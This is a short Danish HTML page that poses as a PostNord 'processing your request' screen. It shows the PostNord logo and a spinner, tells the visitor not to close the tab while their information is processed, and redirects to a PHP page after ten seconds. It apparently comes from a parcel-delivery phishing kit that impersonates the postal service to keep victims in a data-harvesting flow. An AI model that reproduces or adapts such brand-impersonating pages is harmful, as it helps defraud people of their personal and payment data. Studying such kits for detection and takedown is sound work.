<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="refresh" content="10;url=indlaeser_.php"> <!-- Redirect after 10 seconds -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Behandler Din Anmodning - PostNord</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
        }
        .loading-logo {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-radius: 50%;
            border-top: 5px solid #3498db;
            animation: spin 2s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div>
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a3/PostNord_wordmark.svg" alt="PostNord Logo" style="max-width: 200px;">
    </div>
    <div class="loading-logo"></div>
    <h2>Vent venligst...</h2>
    <p>Behandler din information. Luk ikke denne fane.</p>
</body>
</html>
